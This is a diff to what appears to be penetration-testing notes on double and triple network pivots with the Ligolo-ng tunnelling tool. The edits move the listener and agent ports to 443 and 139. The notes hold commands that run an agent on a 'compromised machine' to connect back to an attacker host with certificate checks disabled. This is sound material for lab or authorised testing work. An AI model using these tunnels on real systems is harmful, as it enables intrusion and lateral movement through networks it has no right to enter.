@@ -2,7 +2,7 @@
 *Tips for stability*: `sudo ip link set tun0 mtu 1000`
 
 ---
-## First Pivot  
+## First Pivot
 
 Create Interface
 
@@ -41,13 +41,13 @@ ip link delete ligolo
 Create Interface
 
 ```
-sudo ip tuntap add user saitama mode tun ligolo-double && sudo ip link set ligolo-double up && ligolo-proxy -selfcert -laddr 0.0.0.0:11602
+sudo ip tuntap add user saitama mode tun ligolo-double && sudo ip link set ligolo-double up && ligolo-proxy -selfcert -laddr 0.0.0.0:443
 ```
 
 Run Ligolo Agent on Compromised Machine
 
 ```
-./agent -connect 10.10.10.10:11602 -ignore-cert
+./agent -connect 10.10.10.10:443 -ignore-cert
 ```
 
 Create Tunnel on Ligolo
@@ -70,19 +70,18 @@ ip link delete ligolo-double
 ```
 
 ---
-
 #### Triple Pivot
 
 Create Interface
 
 ```
-sudo ip tuntap add user saitama mode tun ligolo-triple && sudo ip link set ligolo-triple up && ligolo-proxy -selfcert -laddr 0.0.0.0:11603
+sudo ip tuntap add user saitama mode tun ligolo-triple && sudo ip link set ligolo-triple up && ligolo-proxy -selfcert -laddr 0.0.0.0:139
 ```
 
 Run Ligolo Agent on Compromised Machine
 
 ```
-./agent -connect 10.10.10.10:11603 -ignore-cert
+./agent -connect 10.10.10.10:139 -ignore-cert
 ```
 
 Create Tunnel on Ligolo
@@ -104,9 +103,7 @@ Troubleshooting
 ip link delete ligolo-triple
 ```
 
-
-
-
+---
 #### Go on Ligolo Session and Add Listener on First Pivot
 
 ```
